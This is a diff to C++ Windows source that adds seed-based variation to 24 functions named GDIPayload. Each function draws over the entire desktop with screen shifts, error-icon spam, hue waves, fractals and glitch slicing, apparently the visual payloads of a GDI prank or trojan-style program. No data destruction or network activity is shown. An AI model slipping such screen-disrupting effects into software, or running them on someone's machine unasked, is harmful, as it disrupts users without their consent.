@@ -23,6 +23,9 @@
 
 DWORD WINAPI GDIPayload1(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(1);
+    srand(SeedRand(1));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -54,13 +57,13 @@ DWORD WINAPI GDIPayload1(LPVOID)
     {
         StretchBlt(
             dcCopy,
-            rand() % 3,
-            rand() % 3,
+            (rand() % 3) * sd.dir,
+            (rand() % 3) * sd.dir,
             w,
             h,
             dc,
-            rand() % 3,
-            rand() % 3,
+            (rand() % 3) * sd.dir,
+            (rand() % 3) * sd.dir,
             w,
             h,
             SRCCOPY
@@ -80,7 +83,7 @@ DWORD WINAPI GDIPayload1(LPVOID)
             SRCCOPY
         );
 
-        Sleep(rand() % 25);
+        Sleep(rand() % (25 - sd.amp / 2));
 
         if (rand() % 25 == 24)
         {
@@ -110,6 +113,9 @@ DWORD WINAPI GDIPayload1(LPVOID)
 
 DWORD WINAPI GDIPayload2(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(2);
+    srand(SeedRand(2));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -146,8 +152,8 @@ DWORD WINAPI GDIPayload2(LPVOID)
             dcCopy,
             0,
             0,
-            std::max(1, w / 3),
-            std::max(1, h / 3),
+            std::max(1, w / (3 - sd.dir)),
+            std::max(1, h / (3 - sd.dir)),
             dc,
             0,
             0,
@@ -165,8 +171,8 @@ DWORD WINAPI GDIPayload2(LPVOID)
             dcCopy,
             0,
             0,
-            std::max(1, w / 3),
-            std::max(1, h / 3),
+            std::max(1, w / (3 - sd.dir)),
+            std::max(1, h / (3 - sd.dir)),
             SRCCOPY
         );
 
@@ -203,6 +209,9 @@ DWORD WINAPI GDIPayload2(LPVOID)
 
 DWORD WINAPI GDIPayload3(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(3);
+    srand(SeedRand(3));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -213,7 +222,7 @@ DWORD WINAPI GDIPayload3(LPVOID)
 
     HICON errorIcon = LoadIcon(NULL, IDI_ERROR);
 
-    for (int i = 0; i < 300; ++i)
+    for (int i = 0; i < 300 * sd.amp / 4; ++i)
     {
         if (errorIcon)
         {
@@ -225,7 +234,7 @@ DWORD WINAPI GDIPayload3(LPVOID)
             );
         }
 
-        Sleep(50);
+        Sleep(50 - sd.amp);
 
         if (i % 25 == 24)
         {
@@ -251,6 +260,9 @@ DWORD WINAPI GDIPayload3(LPVOID)
 
 DWORD WINAPI GDIPayload4(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(4);
+    srand(SeedRand(4));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -259,9 +271,9 @@ DWORD WINAPI GDIPayload4(LPVOID)
     const int w = GetSystemMetrics(SM_CXSCREEN);
     const int h = GetSystemMetrics(SM_CYSCREEN);
 
-    for (int x = 0; x <= w; x += 16)
+    for (int x = 0; x <= w; x += (13 - sd.amp / 2))
     {
-        for (int y = 0; y <= h; y += 16)
+        for (int y = 0; y <= h; y += (13 - sd.amp / 2))
         {
             PatBlt(
                 dc,
@@ -293,6 +305,9 @@ DWORD WINAPI GDIPayload4(LPVOID)
 
 DWORD WINAPI GDIPayload5(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(5);
+    srand(SeedRand(5));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -347,8 +362,8 @@ DWORD WINAPI GDIPayload5(LPVOID)
     {
         BitBlt(
             dcCopy,
-            rand() % 10,
-            rand() % 12,
+            (rand() % 10) * sd.dir,
+            (rand() % 12) * sd.dir,
             w,
             h,
             dc,
@@ -389,6 +404,8 @@ DWORD WINAPI GDIPayload5(LPVOID)
 
 DWORD WINAPI GDIPayload6(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(6);
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -461,14 +478,14 @@ DWORD WINAPI GDIPayload6(LPVOID)
                 int wave =
                     static_cast<int>(
                         std::sin(
-                            (x + t * 4) * 0.025
-                        ) * 32
+                            (x + t * 4 + sd.phase) * 0.025
+                        ) * (32 + sd.amp / 2)
                         );
 
                 pixels[i] =
                     ShiftHSL(
                         pixels[i],
-                        wave / 255.0f,
+                        wave / 255.0f * sd.dir,
                         0.0f,
                         0.0f
                     );
@@ -505,6 +522,8 @@ DWORD WINAPI GDIPayload6(LPVOID)
 
 DWORD WINAPI GDIPayload7(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(7);
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -577,18 +596,18 @@ DWORD WINAPI GDIPayload7(LPVOID)
                 double fx =
                     (
                         t +
-                        t * std::sin(x / 16.0) +
+                        t * std::sin((x + sd.phase) / (16.0 - sd.amp)) +
                         t +
-                        t * std::sin(y / 8.0) +
+                        t * std::sin((y + sd.phase) / (8.0 - sd.amp / 2)) +
                         t +
-                        t * std::sin((x + y) / 16.0) +
+                        t * std::sin((x + y + sd.phase) / 16.0) +
                         t +
                         t * std::sin(
                             std::sqrt(
                                 static_cast<double>(
                                     x * x + y * y
                                     )
-                            ) / 8.0
+                            ) / (8.0 - sd.amp / 2)
                         )
                         ) / 4.0;
 
@@ -600,7 +619,7 @@ DWORD WINAPI GDIPayload7(LPVOID)
                 pixels[i] =
                     ShiftHSL(
                         pixels[i],
-                        -wave / 255.0f,
+                        -wave / 255.0f * sd.dir,
                         0.0f,
                         0.0f
                     );
@@ -637,6 +656,8 @@ DWORD WINAPI GDIPayload7(LPVOID)
 
 DWORD WINAPI GDIPayload8(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(8);
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -708,10 +729,10 @@ DWORD WINAPI GDIPayload8(LPVOID)
                 double fractalY = 1.90 / h;
 
                 double cx =
-                    x * fractalX - 2.0;
+                    x * fractalX - (2.0 - sd.phase * 0.0001);
 
                 double cy =
-                    y * fractalY - 0.95;
+                    y * fractalY - (0.95 - sd.phase * 0.0001);
 
                 double zx = 0;
                 double zy = 0;
@@ -784,6 +805,9 @@ DWORD WINAPI GDIPayload8(LPVOID)
 
 DWORD WINAPI GDIPayload9(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(9);
+    srand(SeedRand(9));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -835,7 +859,7 @@ DWORD WINAPI GDIPayload9(LPVOID)
 
     for (int frame = 0; frame < 150; ++frame)
     {
-        int j = 1 + rand() % 12;
+        int j = sd.amp + rand() % 12;
 
         SetStretchBltMode(dcCopy, COLORONCOLOR);
         SetStretchBltMode(dc, COLORONCOLOR);
@@ -871,13 +895,13 @@ DWORD WINAPI GDIPayload9(LPVOID)
 
                 int wave =
                     static_cast<int>(
-                        std::sin(fx * 0.025f) * 45.0f
+                        std::sin((fx + sd.phase) * 0.025f) * (45.0f + sd.amp)
                         );
 
                 pixels[i] =
                     ShiftHSL(
                         pixels[i],
-                        -wave / 255.0f,
+                        -wave / 255.0f * sd.dir,
                         0.0f,
                         0.0f
                     );
@@ -928,6 +952,9 @@ DWORD WINAPI GDIPayload9(LPVOID)
 
 DWORD WINAPI GDIPayload10(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(10);
+    srand(SeedRand(10));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -959,9 +986,9 @@ DWORD WINAPI GDIPayload10(LPVOID)
     {
         HBRUSH brush = CreateSolidBrush(
             RGB(
-                rand() % 255,
-                rand() % 255,
-                rand() % 255
+                rand() % (255 - sd.amp * 10),
+                rand() % (255 - sd.amp * 5),
+                rand() % (255 - sd.amp * 20)
             )
         );
 
@@ -1031,6 +1058,9 @@ DWORD WINAPI GDIPayload10(LPVOID)
 
 DWORD WINAPI GDIPayload11(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(11);
+    srand(SeedRand(11));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -1078,7 +1108,7 @@ DWORD WINAPI GDIPayload11(LPVOID)
 
     HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);
 
-    int intensity = 15;
+    int intensity = 15 - sd.amp / 2;
 
     for (int frame = 0; frame < 300; ++frame)
     {
@@ -1096,8 +1126,8 @@ DWORD WINAPI GDIPayload11(LPVOID)
             dcCopy,
             rand() % 3,
             rand() % 3,
-            std::max(1, w / 4),
-            std::max(1, h / 4),
+            std::max(1, w / (5 - sd.amp / 4)),
+            std::max(1, h / (5 - sd.amp / 4)),
             dc,
             rand() % 3,
             rand() % 3,
@@ -1118,7 +1148,7 @@ DWORD WINAPI GDIPayload11(LPVOID)
                 int g = (px >> 8) & 255;
                 int b = (px >> 16) & 255;
 
-                int channel = rand() % 3;
+                int channel = (rand() + sd.phase / 4) % 3;
                 int amount =
                     rand() % (intensity + 1);
 
@@ -1150,8 +1180,8 @@ DWORD WINAPI GDIPayload11(LPVOID)
             dcCopy,
             0,
             0,
-            std::max(1, w / 4),
-            std::max(1, h / 4),
+            std::max(1, w / (5 - sd.amp / 4)),
+            std::max(1, h / (5 - sd.amp / 4)),
             SRCCOPY
         );
 
@@ -1173,6 +1203,9 @@ DWORD WINAPI GDIPayload11(LPVOID)
 
 DWORD WINAPI GDIPayload12(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(12);
+    srand(SeedRand(12));
+
     HDC dc = GetDC(NULL);
 
     if (!dc)
@@ -1202,9 +1235,9 @@ DWORD WINAPI GDIPayload12(LPVOID)
 
     for (int frame = 0; frame < 450; ++frame)
     {
-        int fx = rand() % h;
+        int fx = (rand() + sd.phase * 3) % h;
 
-        if (rand() % 3 == 2)
+        if (rand() % (3 + sd.amp / 4) == 2)
         {
             StretchBlt(
                 dcCopy,
@@ -1289,6 +1322,8 @@ DWORD WINAPI GDIPayload12(LPVOID)
 
 DWORD WINAPI GDIPayload13(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(13);
+
     GDISurface s;
 
     if (!s.Init())
@@ -1332,7 +1367,7 @@ DWORD WINAPI GDIPayload13(LPVOID)
         for (int y = 0; y < s.h; ++y)
         {
             int sy =
-                (y * 3 + t * 5)
+                (y * 3 + t * 5 + sd.phase / 2)
                 & 1023;
 
             for (int x = 0; x < s.w; ++x)
@@ -1342,7 +1377,7 @@ DWORD WINAPI GDIPayload13(LPVOID)
 
                 int rWave =
                     sine[
-                        (x + t * 4)
+                        (x + t * 4 + sd.phase)
                             & 1023
                     ];
 
@@ -1350,7 +1385,8 @@ DWORD WINAPI GDIPayload13(LPVOID)
                     sine[
                         (x * 2 +
                             y * 3 +
-                            t * 2)
+                            t * 2 +
+                            sd.phase)
                             & 1023
                     ];
 
@@ -1364,7 +1400,7 @@ DWORD WINAPI GDIPayload13(LPVOID)
                     ShiftHSL(
                         p[i],
                         (rWave + gWave + bWave)
-                            / 3.0f / 255.0f,
+                            / 3.0f / 255.0f * sd.dir,
                         0.0f,
                         0.0f
                     );
@@ -1388,6 +1424,8 @@ DWORD WINAPI GDIPayload13(LPVOID)
 
 DWORD WINAPI GDIPayload14(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(14);
+
     GDISurface s;
 
     if (!s.Init())
@@ -1412,9 +1450,9 @@ DWORD WINAPI GDIPayload14(LPVOID)
             int wave =
                 static_cast<int>(
                     std::sin(
-                        (y + t) * 0.035
+                        (y + t + sd.phase / 4) * 0.035
                     ) *
-                    32.0
+                    (32.0 * sd.amp / 4)
                     );
 
             for (int x = 0; x < s.w; ++x)
@@ -1435,11 +1473,11 @@ DWORD WINAPI GDIPayload14(LPVOID)
                     (px >> 16) & 255;
 
                 int rShift =
-                    ((x + wave) & 31)
+                    ((x + wave * sd.dir) & 31)
                     - 16;
 
                 int gShift =
-                    ((x - wave) & 31)
+                    ((x - wave * sd.dir) & 31)
                     - 16;
 
                 p[i] =
@@ -1468,6 +1506,8 @@ DWORD WINAPI GDIPayload14(LPVOID)
 
 DWORD WINAPI GDIPayload15(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(15);
+
     HDC dc = GetDC(nullptr);
 
     if (!dc)
@@ -1495,17 +1535,17 @@ DWORD WINAPI GDIPayload15(LPVOID)
         int offset =
             static_cast<int>(
                 std::sin(
-                    t * 0.07
+                    (t + sd.phase / 2) * 0.07
                 ) *
-                35.0
+                (35.0 + sd.amp)
                 );
 
         int zoom =
             static_cast<int>(
                 std::sin(
-                    t * 0.035
+                    (t + sd.phase / 3) * 0.035
                 ) *
-                35.0
+                (35.0 * sd.amp / 4)
                 );
 
         StretchBlt(
@@ -1557,13 +1597,15 @@ DWORD WINAPI GDIPayload15(LPVOID)
 
 DWORD WINAPI GDIPayload16(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(16);
+
     GDISurface s;
 
     if (!s.Init())
         return 0;
 
     uint32_t rng =
-        0xA53C91EF;
+        sd.rng;
 
     ULONGLONG start =
         GetTickCount64();
@@ -1574,7 +1616,7 @@ DWORD WINAPI GDIPayload16(LPVOID)
     {
         s.Capture();
 
-        for (int i = 0; i < 45; ++i)
+        for (int i = 0; i < 45 * sd.amp / 4; ++i)
         {
             int y =
                 FXRand(rng) %
@@ -1582,12 +1624,12 @@ DWORD WINAPI GDIPayload16(LPVOID)
 
             int height =
                 2 +
-                FXRand(rng) % 32;
+                FXRand(rng) % (28 + sd.amp * 2);
 
             int offset =
                 static_cast<int>(
-                    FXRand(rng) % 180
-                    ) - 90;
+                    FXRand(rng) % (150 + sd.amp * 10)
+                    ) - (75 + sd.amp * 5);
 
             BitBlt(
                 s.screen,
@@ -1630,6 +1672,8 @@ DWORD WINAPI GDIPayload16(LPVOID)
 
 DWORD WINAPI GDIPayload17(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(17);
+
     GDISurface s;
 
     if (!s.Init())
@@ -1723,10 +1767,10 @@ DWORD WINAPI GDIPayload17(LPVOID)
                 int pulse =
                     static_cast<int>(
                         std::sin(
-                            (x + y + t)
+                            (x + y + t + sd.phase / 2)
                             * 0.025
                         ) *
-                        30.0
+                        (30.0 + sd.amp * 2)
                         );
 
                 p[i] =
@@ -1758,6 +1802,8 @@ DWORD WINAPI GDIPayload17(LPVOID)
 
 DWORD WINAPI GDIPayload18(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(18);
+
     GDISurface s;
 
     if (!s.Init())
@@ -1774,7 +1820,7 @@ DWORD WINAPI GDIPayload18(LPVOID)
     {
         s.Capture();
 
-        constexpr int slice = 6;
+        int slice = 4 + sd.amp;
 
         for (
             int y = 0;
@@ -1786,9 +1832,10 @@ DWORD WINAPI GDIPayload18(LPVOID)
                 static_cast<int>(
                     std::sin(
                         y * 0.045 +
-                        t * 0.12
+                        t * 0.12 +
+                        sd.phase * 0.0002
                     ) *
-                    45.0
+                    (45.0 * sd.amp / 4)
                     );
 
             int rows =
@@ -1825,6 +1872,8 @@ DWORD WINAPI GDIPayload18(LPVOID)
 
 DWORD WINAPI GDIPayload19(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(19);
+
     HDC dc = GetDC(nullptr);
 
     if (!dc)
@@ -1855,9 +1904,9 @@ DWORD WINAPI GDIPayload19(LPVOID)
         int wave =
             static_cast<int>(
                 std::sin(
-                    t * 0.04
+                    (t + sd.phase / 8) * 0.04
                 ) *
-                100.0
+                (100.0 * sd.amp / 4)
                 );
 
         POINT pts[3];
@@ -1922,6 +1971,8 @@ DWORD WINAPI GDIPayload19(LPVOID)
 
 DWORD WINAPI GDIPayload20(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(20);
+
     GDISurface s;
 
     if (!s.Init())
@@ -1967,7 +2018,7 @@ DWORD WINAPI GDIPayload20(LPVOID)
         {
             int rowWave =
                 sine[
-                    (y * 3 + t * 4)
+                    (y * 3 + t * 4 + sd.phase / 2)
                         & 2047
                 ];
 
@@ -1981,14 +2032,15 @@ DWORD WINAPI GDIPayload20(LPVOID)
                         (
                             x * 2 +
                             rowWave +
-                            t * 7
+                            t * 7 +
+                            sd.phase
                             ) & 2047
                     ];
 
                 p[i] =
                     ShiftHSL(
                         p[i],
-                        wave / 255.0f,
+                        wave / 255.0f * sd.dir,
                         0.0f,
                         (sine[(wave + t * 5) & 2047] - 128)
                             / 255.0f / 4.0f
@@ -2013,6 +2065,8 @@ DWORD WINAPI GDIPayload20(LPVOID)
 
 DWORD WINAPI GDIPayload21(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(21);
+
     HDC dc = GetDC(nullptr);
 
     if (!dc)
@@ -2038,7 +2092,7 @@ DWORD WINAPI GDIPayload21(LPVOID)
     while (!FXTimeout(start, 5000))
     {
         double phase =
-            t * 0.06;
+            (t + sd.phase / 8) * 0.06;
 
         int radius =
             static_cast<int>(
@@ -2047,7 +2101,8 @@ DWORD WINAPI GDIPayload21(LPVOID)
                     1.0
                     ) *
                 0.5 *
-                (w / 2)
+                (w / 2) *
+                (sd.amp / 4.0)
                 );
 
         int distortion =
@@ -2055,7 +2110,7 @@ DWORD WINAPI GDIPayload21(LPVOID)
                 std::sin(
                     phase * 2.0
                 ) *
-                55.0
+                (55.0 + sd.amp * 4)
                 );
 
         int left =
@@ -2126,6 +2181,8 @@ DWORD WINAPI GDIPayload21(LPVOID)
 
 DWORD WINAPI GDIPayload22(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(22);
+
     GDISurface s;
 
     if (!s.Init())
@@ -2195,14 +2252,15 @@ DWORD WINAPI GDIPayload22(LPVOID)
                     sine[
                         (
                             (dist2 >> 10) +
-                            t * 8
+                            t * 8 +
+                            sd.phase
                             ) & 2047
                     ];
 
                 p[i] =
                     ShiftHSL(
                         p[i],
-                        wave / 255.0f / 2.0f,
+                        wave / 255.0f / 2.0f * sd.dir,
                         0.0f,
                         wave / 255.0f / 4.0f
                     );
@@ -2226,6 +2284,8 @@ DWORD WINAPI GDIPayload22(LPVOID)
 
 DWORD WINAPI GDIPayload23(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(23);
+
     GDISurface s;
 
     if (!s.Init())
@@ -2259,15 +2319,16 @@ DWORD WINAPI GDIPayload23(LPVOID)
                     static_cast<int>(
                         std::sin(
                             x * 0.015 +
-                            t * 0.08
+                            t * 0.08 +
+                            sd.phase * 0.0002
                         ) *
-                        16
+                        (16.0 + sd.amp)
                         );
 
                 p[i] =
                     ShiftHSL(
                         p[i],
-                        aberration / 255.0f,
+                        aberration / 255.0f * sd.dir,
                         0.0f,
                         scanline == 0 ? -0.20f : 0.0f
                     );
@@ -2291,6 +2352,8 @@ DWORD WINAPI GDIPayload23(LPVOID)
 
 DWORD WINAPI GDIPayload24(LPVOID)
 {
+    const SeedVariant& sd = SeedGet(24);
+
     HDC dc = GetDC(nullptr);
 
     if (!dc)
@@ -2307,7 +2370,7 @@ DWORD WINAPI GDIPayload24(LPVOID)
         );
 
     uint32_t rng =
-        0x91827364;
+        sd.rng;
 
     int frame = 0;
 
@@ -2425,13 +2488,13 @@ DWORD WINAPI GDIPayload24(LPVOID)
 
             int height =
                 4 +
-                FXRand(rng) % 50;
+                FXRand(rng) % (40 + sd.amp * 5);
 
             int offset =
                 static_cast<int>(
-                    FXRand(rng) % 250
+                    FXRand(rng) % (200 + sd.amp * 15)
                     ) -
-                125;
+                (100 + sd.amp * 8);
 
             BitBlt(
                 dc,
@@ -2468,9 +2531,9 @@ DWORD WINAPI GDIPayload24(LPVOID)
             int wobble =
                 static_cast<int>(
                     std::sin(
-                        frame * 0.05
+                        (frame + sd.phase / 6) * 0.05
                     ) *
-                    100.0
+                    (100.0 * sd.amp / 4)
                     );
 
             pts[0] =
